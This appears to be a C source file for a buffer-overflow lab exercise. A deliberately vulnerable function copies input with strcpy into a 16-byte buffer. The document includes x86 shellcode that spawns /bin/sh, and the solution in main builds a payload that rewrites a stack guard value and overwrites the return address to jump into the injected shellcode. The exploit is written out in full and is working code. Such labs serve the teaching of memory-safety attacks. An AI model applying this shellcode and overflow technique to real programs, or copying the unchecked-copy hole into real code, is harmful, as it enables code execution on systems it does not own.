/* exploit.c  */

/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdql                           */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

/**
 * Function that calls an assembly instuction
 * to return the address of the top of the stack
 * You might not necessarily use this function
 **/
unsigned long get_sp(void){
    __asm__("movl %esp,%eax");
}

/**
 * vulnerable function bof
 **/
void bof(char *str){
    /* 16-byte buffer is statically allocated by the compiler */
    char buffer[16];
    printf("Come into function bof\n");
    int guard = 0x41304130;

    /* The following unsafe function call may cause a buffer overflow */
    strcpy(buffer, str);

    /* You need to bypass this check */
    if(guard != 0x41304130) {
        printf("Good bye!\n");
        exit(0);
    }
}



/* You need to craft buffer data passed to function bof
 * To execute the shellcode
 *
 * The target is:
 * the execution flow will be guided into shellcode and
 * exits there without coming back to main function
 *
 * The shellcode has been implemented already, you only
 * need to
 * 1. prepare appropriate contents in the buffer
 * 2. overwrite the return address of bof function
 * on the stack to the address of shellcode.
 * */

int main(int argc, char **argv){
    char buffer[100];
    printf("Come into function main\n");

    /* You need to fill the buffer with appropriate contents here
     * e.g. putting the return address and copy the shell code
     * You should add code here
     * */
memset(buffer, 0x01, 100);
memset(buffer, 'a', 16);
memset(buffer+16, 0x30, 1);
memset(buffer+17, 0x41, 1);
memset(buffer+18, 0x30, 1);
memset(buffer+19, 0x41, 1);
// memset(buffer+20, 'b', 4);
// unsigned int address = (unsigned int) &shellcode;
unsigned int address = (unsigned int) &buffer[28];
memcpy(buffer+24, &address, 4);
strncpy(buffer+28, shellcode, sizeof(shellcode));



    /* bof is called here
     * please DON'T CHANGE code after this line
     * */
    bof(buffer);

    printf("Exit from function bof\n");
    printf("You will succeed next time!\n");
}
